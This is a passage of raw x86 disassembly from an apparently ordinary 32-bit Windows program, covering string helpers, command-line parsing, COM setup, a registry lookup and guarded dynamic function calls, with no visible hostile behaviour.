  40386b:	cmp    WORD PTR [edi],ax
  40386e:	je     0x403878
  403870:	add    edi,0x2
  403873:	sub    ecx,0x1
  403876:	jne    0x40386b
  403878:	test   ecx,ecx
  40387a:	je     0x403882
  40387c:	mov    eax,edx
  40387e:	sub    eax,ecx
  403880:	jmp    0x403887
  403882:	mov    esi,0x80070057
  403887:	pop    edi
  403888:	test   esi,esi
  40388a:	js     0x40389d
  40388c:	push   ecx
  40388d:	push   DWORD PTR [ebp+0x8]
  403890:	sub    edx,eax
  403892:	push   ecx
  403893:	lea    ecx,[ebx+eax*2]
  403896:	call   0x4038aa
  40389b:	mov    esi,eax
  40389d:	mov    eax,esi
  40389f:	pop    esi
  4038a0:	pop    ebx
  4038a1:	pop    ebp
  4038a2:	ret    0x4
  4038a5:	int3   
  4038a6:	int3   
  4038a7:	int3   
  4038a8:	int3   
  4038a9:	int3   
  4038aa:	mov    edi,edi
  4038ac:	push   ebp
  4038ad:	mov    ebp,esp
  4038af:	push   edi
  4038b0:	xor    edi,edi
  4038b2:	test   edx,edx
  4038b4:	je     0x4038e1
  4038b6:	mov    eax,DWORD PTR [ebp+0xc]
  4038b9:	push   ebx
  4038ba:	push   esi
  4038bb:	mov    esi,0x7ffffffe
  4038c0:	sub    eax,ecx
  4038c2:	test   esi,esi
  4038c4:	je     0x4038db
  4038c6:	movzx  ebx,WORD PTR [eax+ecx*1]
  4038ca:	test   bx,bx
  4038cd:	je     0x4038db
  4038cf:	mov    WORD PTR [ecx],bx
  4038d2:	add    ecx,0x2
  4038d5:	dec    esi
  4038d6:	sub    edx,0x1
  4038d9:	jne    0x4038c2
  4038db:	pop    esi
  4038dc:	pop    ebx
  4038dd:	test   edx,edx
  4038df:	jne    0x4038e9
  4038e1:	sub    ecx,0x2
  4038e4:	mov    edi,0x8007007a
  4038e9:	xor    eax,eax
  4038eb:	mov    WORD PTR [ecx],ax
  4038ee:	mov    eax,edi
  4038f0:	pop    edi
  4038f1:	pop    ebp
  4038f2:	ret    0xc
  4038f5:	int3   
  4038f6:	int3   
  4038f7:	int3   
  4038f8:	int3   
  4038f9:	int3   
  4038fa:	mov    edi,edi
  4038fc:	push   ebp
  4038fd:	mov    ebp,esp
  4038ff:	xor    eax,eax
  403901:	test   edx,edx
  403903:	je     0x40390d
  403905:	cmp    edx,0x7fffffff
  40390b:	jbe    0x403912
  40390d:	mov    eax,0x80070057
  403912:	test   eax,eax
  403914:	js     0x403922
  403916:	push   ecx
  403917:	push   DWORD PTR [ebp+0x8]
  40391a:	push   ecx
  40391b:	call   0x4038aa
  403920:	jmp    0x40392b
  403922:	test   edx,edx
  403924:	je     0x40392b
  403926:	xor    edx,edx
  403928:	mov    WORD PTR [ecx],dx
  40392b:	pop    ebp
  40392c:	ret    0x4
  40392f:	int3   
  403930:	int3   
  403931:	int3   
  403932:	int3   
  403933:	int3   
  403934:	mov    edi,edi
  403936:	push   esi
  403937:	push   edi
  403938:	mov    edi,edx
  40393a:	jmp    0x403945
  40393c:	cmp    ax,0x20
  403940:	jne    0x40394d
  403942:	add    edi,0x2
  403945:	movzx  eax,WORD PTR [edi]
  403948:	test   ax,ax
  40394b:	jne    0x40393c
  40394d:	xor    esi,esi
  40394f:	push   esi
  403950:	call   DWORD PTR ds:0x409068
  403956:	or     eax,0x8001
  40395b:	push   eax
  40395c:	call   DWORD PTR ds:0x409068
  403962:	push   0x4013d4
  403967:	push   edi
  403968:	call   DWORD PTR ds:0x40910c
  40396e:	test   eax,eax
  403970:	je     0x4039d9
  403972:	push   0x4013dc
  403977:	push   edi
  403978:	call   DWORD PTR ds:0x40910c
  40397e:	test   eax,eax
  403980:	je     0x4039d9
  403982:	movzx  eax,WORD PTR [edi]
  403985:	test   ax,ax
  403988:	je     0x4039c8
  40398a:	cmp    eax,0x2d
  40398d:	je     0x403994
  40398f:	cmp    eax,0x2f
  403992:	jne    0x4039a7
  403994:	movzx  eax,WORD PTR [edi+0x2]
  403998:	test   ax,ax
  40399b:	je     0x4039a7
  40399d:	cmp    WORD PTR [edi+0x4],si
  4039a1:	jne    0x4039a7
  4039a3:	mov    esi,eax
  4039a5:	jmp    0x4039c8
  4039a7:	push   0x4013e4
  4039ac:	push   edi
  4039ad:	call   DWORD PTR ds:0x409108
  4039b3:	push   eax
  4039b4:	call   DWORD PTR ds:0x40910c
  4039ba:	mov    esi,eax
  4039bc:	neg    esi
  4039be:	sbb    esi,esi
  4039c0:	neg    esi
  4039c2:	add    esi,0xfffc
  4039c8:	call   DWORD PTR ds:0x4090d0
  4039ce:	pop    edi
  4039cf:	mov    ecx,esi
  4039d1:	mov    edx,eax
  4039d3:	pop    esi
  4039d4:	jmp    0x405d8e
  4039d9:	push   0x7f02
  4039de:	push   esi
  4039df:	call   DWORD PTR ds:0x409138
  4039e5:	push   eax
  4039e6:	call   DWORD PTR ds:0x40913c
  4039ec:	mov    esi,eax
  4039ee:	call   0x4035d0
  4039f3:	push   esi
  4039f4:	call   DWORD PTR ds:0x40913c
  4039fa:	pop    edi
  4039fb:	pop    esi
  4039fc:	ret    
  4039fd:	int3   
  4039fe:	int3   
  4039ff:	int3   
  403a00:	int3   
  403a01:	int3   
  403a02:	mov    edi,edi
  403a04:	push   ebp
  403a05:	mov    ebp,esp
  403a07:	push   ecx
  403a08:	push   ebx
  403a09:	push   edi
  403a0a:	xor    edi,edi
  403a0c:	xor    ebx,ebx
  403a0e:	push   edi
  403a0f:	push   edi
  403a10:	inc    ebx
  403a11:	push   ebx
  403a12:	push   edi
  403a13:	call   DWORD PTR ds:0x40906c
  403a19:	call   DWORD PTR ds:0x409070
  403a1f:	and    eax,0x3ff
  403a24:	push   0x4
  403a26:	pop    ecx
  403a27:	cmp    ax,0x11
  403a2b:	je     0x403a38
  403a2d:	cmp    ax,0x12
  403a31:	je     0x403a38
  403a33:	cmp    ax,cx
  403a36:	jne    0x403a3f
  403a38:	push   edi
  403a39:	call   DWORD PTR ds:0x409044
  403a3f:	push   esi
  403a40:	push   0x6
  403a42:	push   edi
  403a43:	call   DWORD PTR ds:0x409148
  403a49:	mov    esi,eax
  403a4b:	cmp    esi,ebx
  403a4d:	je     0x403a66
  403a4f:	cmp    esi,0x80010106
  403a55:	jne    0x403a74
  403a57:	push   0x4
  403a59:	push   edi
  403a5a:	call   DWORD PTR ds:0x409148
  403a60:	mov    esi,eax
  403a62:	cmp    esi,ebx
  403a64:	jne    0x403a6a
  403a66:	mov    esi,edi
  403a68:	jmp    0x403a74
  403a6a:	cmp    esi,0x80010106
  403a70:	jne    0x403a74
  403a72:	mov    esi,ebx
  403a74:	mov    eax,DWORD PTR [ebp+0x8]
  403a77:	mov    ds:0x4084fc,eax
  403a7c:	lea    eax,[ebp-0x4]
  403a7f:	push   eax
  403a80:	push   0x4083c8
  403a85:	push   edi
  403a86:	push   0xf
  403a88:	push   edi
  403a89:	push   edi
  403a8a:	push   edi
  403a8b:	push   0x401370
  403a90:	push   0x80000001
  403a95:	call   DWORD PTR ds:0x409014
  403a9b:	test   eax,eax
  403a9d:	jne    0x403acf
  403a9f:	call   DWORD PTR ds:0x409074
  403aa5:	push   eax
  403aa6:	call   DWORD PTR ds:0x40911c
  403aac:	mov    edi,eax
  403aae:	test   edi,edi
  403ab0:	je     0x403acf
  403ab2:	call   DWORD PTR ds:0x409038
  403ab8:	mov    edx,edi
  403aba:	call   0x403934
  403abf:	mov    eax,ds:0x4083c8
  403ac4:	test   eax,eax
  403ac6:	je     0x403acf
  403ac8:	push   eax
  403ac9:	call   DWORD PTR ds:0x40900c
  403acf:	test   esi,esi
  403ad1:	pop    esi
  403ad2:	jne    0x403ada
  403ad4:	call   DWORD PTR ds:0x40914c
  403ada:	pop    edi
  403adb:	mov    eax,ebx
  403add:	pop    ebx
  403ade:	mov    esp,ebp
  403ae0:	pop    ebp
  403ae1:	ret    0x10
  403ae4:	int3   
  403ae5:	int3   
  403ae6:	int3   
  403ae7:	int3   
  403ae8:	int3   
  403ae9:	mov    edi,edi
  403aeb:	push   ebx
  403aec:	push   esi
  403aed:	xor    eax,eax
  403aef:	mov    ebx,edx
  403af1:	push   edi
  403af2:	mov    esi,ecx
  403af4:	mov    edi,eax
  403af6:	jmp    0x403b15
  403af8:	movzx  eax,WORD PTR [esi]
  403afb:	push   ebx
  403afc:	push   eax
  403afd:	call   DWORD PTR ds:0x409104
  403b03:	test   eax,eax
  403b05:	jne    0x403b10
  403b07:	push   0x5f
  403b09:	pop    eax
  403b0a:	xor    edi,edi
  403b0c:	mov    WORD PTR [esi],ax
  403b0f:	inc    edi
  403b10:	add    esi,0x2
  403b13:	xor    eax,eax
  403b15:	cmp    WORD PTR [esi],ax
  403b18:	jne    0x403af8
  403b1a:	mov    eax,edi
  403b1c:	pop    edi
  403b1d:	pop    esi
  403b1e:	pop    ebx
  403b1f:	ret    
  403b20:	int3   
  403b21:	int3   
  403b22:	int3   
  403b23:	int3   
  403b24:	int3   
  403b25:	mov    edi,edi
  403b27:	push   ebp
  403b28:	mov    ebp,esp
  403b2a:	mov    eax,DWORD PTR [ebp+0xc]
  403b2d:	push   esi
  403b2e:	mov    esi,DWORD PTR [ebp+0x8]
  403b31:	sub    eax,esi
  403b33:	sar    eax,1
  403b35:	push   edi
  403b36:	je     0x403b66
  403b38:	cmp    eax,0x7fffffff
  403b3d:	ja     0x403b66
  403b3f:	lea    edi,[eax-0x1]
  403b42:	lea    eax,[ebp+0x14]
  403b45:	push   eax
  403b46:	push   DWORD PTR [ebp+0x10]
  403b49:	push   edi
  403b4a:	push   esi
  403b4b:	call   DWORD PTR ds:0x4091c8
  403b51:	add    esp,0x10
  403b54:	test   eax,eax
  403b56:	js     0x403b5e
  403b58:	cmp    eax,edi
  403b5a:	ja     0x403b5e
  403b5c:	jne    0x403b6f
  403b5e:	xor    eax,eax
  403b60:	mov    WORD PTR [esi+edi*2],ax
  403b64:	jmp    0x403b6f
  403b66:	test   eax,eax
  403b68:	je     0x403b6f
  403b6a:	xor    eax,eax
  403b6c:	mov    WORD PTR [esi],ax
  403b6f:	cmp    DWORD PTR [ebp+0xc],esi
  403b72:	je     0x403b8b
  403b74:	mov    ecx,esi
  403b76:	lea    edx,[ecx+0x2]
  403b79:	mov    ax,WORD PTR [ecx]
  403b7c:	add    ecx,0x2
  403b7f:	test   ax,ax
  403b82:	jne    0x403b79
  403b84:	sub    ecx,edx
  403b86:	sar    ecx,1
  403b88:	lea    esi,[esi+ecx*2]
  403b8b:	pop    edi
  403b8c:	mov    eax,esi
  403b8e:	pop    esi
  403b8f:	pop    ebp
  403b90:	ret    
  403b91:	int3   
  403b92:	int3   
  403b93:	int3   
  403b94:	int3   
  403b95:	int3   
  403b96:	mov    edi,edi
  403b98:	push   ebp
  403b99:	mov    ebp,esp
  403b9b:	sub    esp,0x208
  403ba1:	mov    eax,ds:0x408004
  403ba6:	xor    eax,ebp
  403ba8:	mov    DWORD PTR [ebp-0x4],eax
  403bab:	push   ebx
  403bac:	push   esi
  403bad:	mov    esi,DWORD PTR [ebp+0x8]
  403bb0:	mov    ebx,0x4013ee
  403bb5:	mov    DWORD PTR [ebp-0x208],ecx
  403bbb:	xor    ecx,ecx
  403bbd:	push   edi
  403bbe:	mov    edi,edx
  403bc0:	mov    eax,DWORD PTR [esi]
  403bc2:	sub    eax,ecx
  403bc4:	je     0x403bf6
  403bc6:	sub    eax,0x1
  403bc9:	je     0x403bef
  403bcb:	sub    eax,0x1
  403bce:	je     0x403be8
  403bd0:	sub    eax,0x1
  403bd3:	je     0x403be1
  403bd5:	sub    eax,0x1
  403bd8:	jne    0x403bfb
  403bda:	mov    ebx,0x40142c
  403bdf:	jmp    0x403bfb
  403be1:	mov    ebx,0x401424
  403be6:	jmp    0x403bfb
  403be8:	mov    ebx,0x40140c
  403bed:	jmp    0x403bfb
  403bef:	mov    ebx,0x401400
  403bf4:	jmp    0x403bfb
  403bf6:	mov    ebx,0x4013f4
  403bfb:	push   ecx
  403bfc:	xor    eax,eax
  403bfe:	push   0x100
  403c03:	mov    WORD PTR [ebp-0x204],ax
  403c0a:	lea    eax,[ebp-0x204]
  403c10:	push   eax
  403c11:	push   0x400
  403c16:	push   DWORD PTR [esi+0x4]
  403c19:	push   ecx
  403c1a:	push   0x1200
  403c1f:	call   DWORD PTR ds:0x409098
  403c25:	cmp    DWORD PTR [esi+0x1c],0x0
  403c29:	mov    eax,DWORD PTR [ebp-0x208]
  403c2f:	push   DWORD PTR [esi+0x48]
  403c32:	push   DWORD PTR [esi+0x44]
  403c35:	lea    edi,[eax+edi*2]
  403c38:	je     0x403c51
  403c3a:	push   DWORD PTR [esi+0x20]
  403c3d:	push   DWORD PTR [esi+0x1c]
  403c40:	push   0x401438
  403c45:	push   edi
  403c46:	push   eax
  403c47:	call   0x403b25
  403c4c:	add    esp,0x1c
  403c4f:	jmp    0x403c60
  403c51:	push   0x40145c
  403c56:	push   edi
  403c57:	push   eax
  403c58:	call   0x403b25
  403c5d:	add    esp,0x14
  403c60:	cmp    DWORD PTR [esi+0x4c],0x0
  403c64:	mov    DWORD PTR [ebp-0x208],eax
  403c6a:	je     0x403c84
  403c6c:	push   DWORD PTR [esi+0x4c]
  403c6f:	push   0x401470
  403c74:	push   edi
  403c75:	push   eax
  403c76:	call   0x403b25
  403c7b:	add    esp,0x10
  403c7e:	mov    DWORD PTR [ebp-0x208],eax
  403c84:	lea    eax,[ebp-0x204]
  403c8a:	push   eax
  403c8b:	push   DWORD PTR [esi+0x4]
  403c8e:	call   DWORD PTR ds:0x4090a4
  403c94:	push   eax
  403c95:	push   DWORD PTR [esi+0x24]
  403c98:	push   ebx
  403c99:	push   0x40148c
  403c9e:	push   edi
  403c9f:	push   DWORD PTR [ebp-0x208]
  403ca5:	call   0x403b25
  403caa:	xor    ecx,ecx
  403cac:	add    esp,0x20
  403caf:	cmp    DWORD PTR [esi+0xc],ecx
  403cb2:	jne    0x403cc2
  403cb4:	cmp    DWORD PTR [esi+0x28],ecx
  403cb7:	jne    0x403cc2
  403cb9:	cmp    DWORD PTR [esi+0x18],ecx
  403cbc:	je     0x403d47
  403cc2:	push   0x4014c0
  403cc7:	push   edi
  403cc8:	push   eax
  403cc9:	call   0x403b25
  403cce:	add    esp,0xc
  403cd1:	cmp    DWORD PTR [esi+0xc],0x0
  403cd5:	je     0x403ce9
  403cd7:	push   DWORD PTR [esi+0xc]
  403cda:	push   0x4014cc
  403cdf:	push   edi
  403ce0:	push   eax
  403ce1:	call   0x403b25
  403ce6:	add    esp,0x10
  403ce9:	cmp    DWORD PTR [esi+0x28],0x0
  403ced:	je     0x403d01
  403cef:	push   DWORD PTR [esi+0x28]
  403cf2:	push   0x4014e4
  403cf7:	push   edi
  403cf8:	push   eax
  403cf9:	call   0x403b25
  403cfe:	add    esp,0x10
  403d01:	cmp    DWORD PTR [esi+0x14],0x0
  403d05:	je     0x403d1e
  403d07:	push   DWORD PTR [esi+0x14]
  403d0a:	push   DWORD PTR [esi+0x18]
  403d0d:	push   0x40150c
  403d12:	push   edi
  403d13:	push   eax
  403d14:	call   0x403b25
  403d19:	add    esp,0x14
  403d1c:	jmp    0x403d47
  403d1e:	cmp    DWORD PTR [esi+0x18],0x0
  403d22:	je     0x403d38
  403d24:	push   DWORD PTR [esi+0x18]
  403d27:	push   0x401524
  403d2c:	push   edi
  403d2d:	push   eax
  403d2e:	call   0x403b25
  403d33:	add    esp,0x10
  403d36:	jmp    0x403d47
  403d38:	push   0x401534
  403d3d:	push   edi
  403d3e:	push   eax
  403d3f:	call   0x403b25
  403d44:	add    esp,0xc
  403d47:	mov    ecx,DWORD PTR [ebp-0x4]
  403d4a:	xor    eax,eax
  403d4c:	pop    edi
  403d4d:	pop    esi
  403d4e:	xor    ecx,ebp
  403d50:	pop    ebx
  403d51:	call   0x406b70
  403d56:	mov    esp,ebp
  403d58:	pop    ebp
  403d59:	ret    0x4
  403d5c:	int3   
  403d5d:	int3   
  403d5e:	int3   
  403d5f:	int3   
  403d60:	int3   
  403d61:	mov    edi,edi
  403d63:	push   esi
  403d64:	mov    esi,ecx
  403d66:	mov    ecx,DWORD PTR [esi]
  403d68:	test   ecx,ecx
  403d6a:	je     0x403d85
  403d6c:	or     eax,0xffffffff
  403d6f:	lock xadd DWORD PTR [ecx],eax
  403d73:	jne    0x403d7e
  403d75:	push   DWORD PTR [esi]
  403d77:	call   DWORD PTR ds:0x4091b8
  403d7d:	pop    ecx
  403d7e:	and    DWORD PTR [esi],0x0
  403d81:	and    DWORD PTR [esi+0x4],0x0
  403d85:	pop    esi
  403d86:	ret    
  403d87:	int3   
  403d88:	int3   
  403d89:	int3   
  403d8a:	int3   
  403d8b:	int3   
  403d8c:	xor    eax,eax
  403d8e:	mov    DWORD PTR ds:0x4083e4,ecx
  403d94:	inc    eax
  403d95:	lock xadd DWORD PTR ds:0x4083e8,eax
  403d9d:	inc    eax
  403d9e:	ret    
  403d9f:	int3   
  403da0:	int3   
  403da1:	int3   
  403da2:	int3   
  403da3:	int3   
  403da4:	xor    eax,eax
  403da6:	mov    DWORD PTR ds:0x4083d0,ecx
  403dac:	inc    eax
  403dad:	lock xadd DWORD PTR ds:0x4083d8,eax
  403db5:	inc    eax
  403db6:	ret    
  403db7:	int3   
  403db8:	int3   
  403db9:	int3   
  403dba:	int3   
  403dbb:	int3   
  403dbc:	xor    eax,eax
  403dbe:	mov    DWORD PTR ds:0x4083e0,ecx
  403dc4:	inc    eax
  403dc5:	lock xadd DWORD PTR ds:0x408414,eax
  403dcd:	inc    eax
  403dce:	ret    
  403dcf:	int3   
  403dd0:	int3   
  403dd1:	int3   
  403dd2:	int3   
  403dd3:	int3   
  403dd4:	xor    eax,eax
  403dd6:	mov    DWORD PTR ds:0x4083dc,ecx
  403ddc:	inc    eax
  403ddd:	lock xadd DWORD PTR ds:0x4083cc,eax
  403de5:	inc    eax
  403de6:	ret    
  403de7:	int3   
  403de8:	int3   
  403de9:	int3   
  403dea:	int3   
  403deb:	int3   
  403dec:	int3   
  403ded:	int3   
  403dee:	int3   
  403def:	int3   
  403df0:	mov    edi,edi
  403df2:	push   ebp
  403df3:	mov    ebp,esp
  403df5:	mov    eax,DWORD PTR [ebp+0x8]
  403df8:	mov    ds:0x40841c,eax
  403dfd:	xor    eax,eax
  403dff:	inc    eax
  403e00:	pop    ebp
  403e01:	ret    0x4
  403e04:	int3   
  403e05:	int3   
  403e06:	int3   
  403e07:	int3   
  403e08:	int3   
  403e09:	int3   
  403e0a:	int3   
  403e0b:	int3   
  403e0c:	int3   
  403e0d:	int3   
  403e0e:	int3   
  403e0f:	int3   
  403e10:	mov    edi,edi
  403e12:	push   ebp
  403e13:	mov    ebp,esp
  403e15:	sub    esp,0x10c
  403e1b:	mov    eax,ds:0x408004
  403e20:	xor    eax,ebp
  403e22:	mov    DWORD PTR [ebp-0x4],eax
  403e25:	cmp    BYTE PTR ds:0x408418,0x0
  403e2c:	push   edi
  403e2d:	mov    edi,0x408428
  403e32:	jne    0x403edd
  403e38:	push   esi
  403e39:	push   0x40
  403e3b:	pop    esi
  403e3c:	push   esi
  403e3d:	push   0x0
  403e3f:	push   edi
  403e40:	call   0x4072ac
  403e45:	and    DWORD PTR [ebp-0x10c],0x0
  403e4c:	lea    eax,[ebp-0x10c]
  403e52:	add    esp,0xc
  403e55:	push   eax
  403e56:	push   0x403df0
  403e5b:	push   0x6
  403e5d:	call   DWORD PTR ds:0x409084
  403e63:	test   eax,eax
  403e65:	je     0x403ed5
  403e67:	push   0x104
  403e6c:	lea    eax,[ebp-0x108]
  403e72:	push   eax
  403e73:	push   DWORD PTR [ebp-0x10c]
  403e79:	call   DWORD PTR ds:0x4090a0
  403e7f:	test   eax,eax
  403e81:	je     0x403ed5
  403e83:	lea    ecx,[ebp-0x108]
  403e89:	lea    edx,[ecx+0x1]
  403e8c:	mov    al,BYTE PTR [ecx]
  403e8e:	inc    ecx
  403e8f:	test   al,al
  403e91:	jne    0x403e8c
  403e93:	sub    ecx,edx
  403e95:	lea    edx,[ebp-0x108]
  403e9b:	add    edx,ecx
  403e9d:	jmp    0x403ea6
  403e9f:	cmp    BYTE PTR [edx-0x1],0x5c
  403ea3:	je     0x403eb0
  403ea5:	dec    edx
  403ea6:	lea    eax,[ebp-0x108]
  403eac:	cmp    edx,eax
  403eae:	ja     0x403e9f
  403eb0:	mov    ecx,edi
  403eb2:	sub    edx,edi
  403eb4:	lea    eax,[esi+0x7fffffbe]
  403eba:	test   eax,eax
  403ebc:	je     0x403ecd
  403ebe:	mov    al,BYTE PTR [edx+ecx*1]
  403ec1:	test   al,al
  403ec3:	je     0x403ecd
  403ec5:	mov    BYTE PTR [ecx],al
  403ec7:	inc    ecx
  403ec8:	sub    esi,0x1
  403ecb:	jne    0x403eb4
  403ecd:	test   esi,esi
  403ecf:	jne    0x403ed2
  403ed1:	dec    ecx
  403ed2:	mov    BYTE PTR [ecx],0x0
  403ed5:	mov    BYTE PTR ds:0x408418,0x1
  403edc:	pop    esi
  403edd:	mov    ecx,DWORD PTR [ebp-0x4]
  403ee0:	mov    eax,edi
  403ee2:	xor    ecx,ebp
  403ee4:	pop    edi
  403ee5:	call   0x406b70
  403eea:	mov    esp,ebp
  403eec:	pop    ebp
  403eed:	ret    
  403eee:	int3   
  403eef:	int3   
  403ef0:	int3   
  403ef1:	int3   
  403ef2:	int3   
  403ef3:	int3   
  403ef4:	int3   
  403ef5:	int3   
  403ef6:	int3   
  403ef7:	int3   
  403ef8:	int3   
  403ef9:	int3   
  403efa:	int3   
  403efb:	int3   
  403efc:	int3   
  403efd:	int3   
  403efe:	int3   
  403eff:	int3   
  403f00:	mov    edi,edi
  403f02:	push   ebp
  403f03:	mov    ebp,esp
  403f05:	push   ecx
  403f06:	mov    eax,ds:0x408004
  403f0b:	xor    eax,ebp
  403f0d:	mov    DWORD PTR [ebp-0x4],eax
  403f10:	push   0x401538
  403f15:	call   DWORD PTR ds:0x409090
  403f1b:	test   eax,eax
  403f1d:	je     0x403f3d
  403f1f:	push   esi
  403f20:	push   0x40154c
  403f25:	push   eax
  403f26:	call   DWORD PTR ds:0x40909c
  403f2c:	mov    esi,eax
  403f2e:	test   esi,esi
  403f30:	je     0x403f3c
  403f32:	mov    ecx,esi
  403f34:	call   DWORD PTR ds:0x409210
  403f3a:	call   esi
  403f3c:	pop    esi
  403f3d:	mov    ecx,DWORD PTR [ebp-0x4]
  403f40:	xor    ecx,ebp
  403f42:	call   0x406b70
  403f47:	mov    esp,ebp
  403f49:	pop    ebp
  403f4a:	ret    
  403f4b:	int3   
  403f4c:	int3   
  403f4d:	int3   
  403f4e:	int3   
  403f4f:	int3   
  403f50:	mov    edi,edi
  403f52:	push   ebp
  403f53:	mov    ebp,esp
  403f55:	push   ecx
  403f56:	mov    eax,ds:0x408004
  403f5b:	xor    eax,ebp
  403f5d:	mov    DWORD PTR [ebp-0x4],eax
  403f60:	push   esi
  403f61:	mov    esi,DWORD PTR ds:0x408410
  403f67:	push   edi
  403f68:	test   esi,esi
  403f6a:	jne    0x403fa5
  403f6c:	mov    eax,ds:0x40840c
  403f71:	xor    edi,edi
  403f73:	test   eax,eax
  403f75:	jne    0x403f8d
  403f77:	push   0x800
  403f7c:	push   edi
  403f7d:	push   0x401538
  403f82:	call   DWORD PTR ds:0x40907c
  403f88:	mov    ds:0x40840c,eax
  403f8d:	push   0x401568
  403f92:	push   eax
  403f93:	call   DWORD PTR ds:0x40909c
  403f99:	mov    esi,eax
  403f9b:	mov    DWORD PTR ds:0x408410,esi
  403fa1:	test   esi,esi
  403fa3:	je     0x403fb4
  403fa5:	push   DWORD PTR [ebp+0x8]
  403fa8:	mov    ecx,esi
  403faa:	call   DWORD PTR ds:0x409210
  403fb0:	call   esi
  403fb2:	mov    edi,eax
  403fb4:	mov    ecx,DWORD PTR [ebp-0x4]
  403fb7:	mov    eax,edi
  403fb9:	pop    edi
  403fba:	xor    ecx,ebp
  403fbc:	pop    esi
  403fbd:	call   0x406b70
  403fc2:	mov    esp,ebp
  403fc4:	pop    ebp
  403fc5:	ret    0x4
  403fc8:	int3   
  403fc9:	int3   
  403fca:	int3   
  403fcb:	int3   
  403fcc:	int3   
  403fcd:	test   ecx,ecx
  403fcf:	jne    0x403fd5
  403fd1:	xor    eax,eax
  403fd3:	inc    eax
  403fd4:	ret    
  403fd5:	lea    edx,[ecx+0x1]
  403fd8:	mov    al,BYTE PTR [ecx]
  403fda:	inc    ecx
  403fdb:	test   al,al
  403fdd:	jne    0x403fd8
  403fdf:	sub    ecx,edx
  403fe1:	lea    eax,[ecx+0x1]
  403fe4:	ret    
  403fe5:	int3   
  403fe6:	int3   
  403fe7:	int3   
  403fe8:	int3   
  403fe9:	int3   
  403fea:	test   ecx,ecx
  403fec:	jne    0x403ff2
  403fee:	push   0x2
  403ff0:	pop    eax
  403ff1:	ret    
  403ff2:	lea    edx,[ecx+0x2]
  403ff5:	mov    ax,WORD PTR [ecx]
  403ff8:	add    ecx,0x2
  403ffb:	test   ax,ax
  403ffe:	jne    0x403ff5
  404000:	sub    ecx,edx
  404002:	sar    ecx,1
  404004:	lea    eax,[ecx*2+0x2]
  40400b:	ret    
  40400c:	int3   
  40400d:	int3   
  40400e:	int3   
  40400f:	int3   
  404010:	int3   
  404011:	mov    edi,edi
  404013:	push   ebp
  404014:	mov    ebp,esp
  404016:	push   ecx
  404017:	push   esi
  404018:	mov    esi,ecx
  40401a:	cmp    DWORD PTR [esi+0xc],0x0
  40401e:	jne    0x404041
  404020:	push   0x1
  404022:	call   0x405e1d
  404027:	mov    DWORD PTR [esi],eax
  404029:	test   eax,eax
  40402b:	je     0x40403d
  40402d:	mov    ecx,DWORD PTR [eax]
  40402f:	mov    DWORD PTR [esi+0x8],ecx
  404032:	mov    DWORD PTR [eax],esi
  404034:	call   DWORD PTR ds:0x4090a4
  40403a:	mov    DWORD PTR [esi+0xc],eax
  40403d:	pop    esi
  40403e:	pop    ecx
  40403f:	pop    ebp
  404040:	ret    
  404041:	push   ecx
  404042:	mov    ecx,DWORD PTR [ebp+0x4]
  404045:	call   0x404778
  40404a:	int3   
  40404b:	int3   
  40404c:	int3   
  40404d:	int3   
  40404e:	int3   
  40404f:	int3   
  404050:	mov    edi,edi
  404052:	push   ebp
  404053:	mov    ebp,esp
  404055:	push   ecx
  404056:	push   esi
  404057:	mov    esi,ecx
  404059:	call   DWORD PTR ds:0x4090a4
  40405f:	cmp    DWORD PTR [esi+0xc],eax
  404062:	je     0x404072
  404064:	push   0x8007029c
  404069:	push   ecx
  40406a:	mov    ecx,DWORD PTR [ebp+0x4]
  40406d:	call   0x40474c
  404072:	mov    eax,DWORD PTR [esi]
  404074:	xor    edx,edx
  404076:	mov    DWORD PTR [esi+0xc],edx
  404079:	jmp    0x404088
  40407b:	mov    eax,DWORD PTR [esi]
  40407d:	mov    eax,DWORD PTR [eax]
  40407f:	cmp    eax,esi
  404081:	je     0x40408e
  404083:	add    eax,0x8
  404086:	mov    DWORD PTR [esi],eax
  404088:	cmp    DWORD PTR [eax],edx
  40408a:	jne    0x40407b
  40408c:	jmp    0x404095
  40408e:	mov    ecx,DWORD PTR [esi]
  404090:	mov    eax,DWORD PTR [esi+0x8]
  404093:	mov    DWORD PTR [ecx],eax
  404095:	mov    DWORD PTR [esi],edx
  404097:	pop    esi
  404098:	pop    ecx
  404099:	pop    ebp
  40409a:	ret    
  40409b:	int3   
  40409c:	int3   
  40409d:	int3   
  40409e:	int3   
  40409f:	int3   
  4040a0:	mov    edi,edi
  4040a2:	push   ebp
  4040a3:	mov    ebp,esp
  4040a5:	push   ecx
  4040a6:	push   ebx
  4040a7:	mov    ebx,DWORD PTR [ebp+0x8]
  4040aa:	xor    al,al
  4040ac:	push   esi
  4040ad:	push   edi
  4040ae:	mov    esi,edx
  4040b0:	mov    edi,ecx
  4040b2:	mov    DWORD PTR [ebp-0x4],edi
  4040b5:	mov    BYTE PTR [ebx],0x0
  4040b8:	test   esi,esi
  4040ba:	je     0x40414f
  4040c0:	push   DWORD PTR [ebp+0xc]
  4040c3:	mov    edx,DWORD PTR [esi+0x8]
  4040c6:	push   ebx
  4040c7:	call   0x4040a0
  4040cc:	mov    edx,DWORD PTR [esi+0x10]
  4040cf:	test   edx,edx
  4040d1:	je     0x40414f
  4040d3:	cmp    DWORD PTR [edx],0x0
  4040d6:	jne    0x4040e6
  4040d8:	xor    eax,eax
  4040da:	inc    eax
  4040db:	lock xadd DWORD PTR ds:0x40800c,eax
  4040e3:	inc    eax
  4040e4:	mov    DWORD PTR [edx],eax
  4040e6:	cmp    DWORD PTR [edi+0x2c],0x0
  4040ea:	jne    0x4040f7
  4040ec:	mov    esi,edx
  4040ee:	lea    edi,[edi+0x2c]
  4040f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040f4:	mov    edi,DWORD PTR [ebp-0x4]
  4040f7:	add    edi,0x38
  4040fa:	mov    esi,edx
  4040fc:	mov    ecx,ebx
  4040fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404100:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404101:	mov    edi,DWORD PTR [ebp+0xc]
  404104:	lea    esi,[ecx+0x1]
  404107:	add    edi,ebx
  404109:	mov    al,BYTE PTR [ecx]
  40410b:	inc    ecx
  40410c:	test   al,al
  40410e:	jne    0x404109
  404110:	sub    ecx,esi
  404112:	mov    eax,edi
  404114:	add    ebx,ecx
  404116:	sub    eax,ebx
